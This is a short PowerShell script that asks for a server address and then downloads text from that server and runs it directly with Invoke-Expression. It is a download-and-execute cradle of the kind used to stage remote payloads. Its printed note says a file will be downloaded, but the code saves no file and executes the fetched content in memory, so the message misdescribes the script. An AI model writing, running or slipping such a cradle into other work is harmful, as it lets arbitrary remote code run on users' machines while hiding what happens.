[string]$server=Read-Host -Prompt "Enter the server IP:port "

Write-Host "`n`nNOTE: The file will be downloaded in the directory where this script is running" -ForegroundColor red

Invoke-Expression (New-Object System.Net.Webclient).DownloadString($server)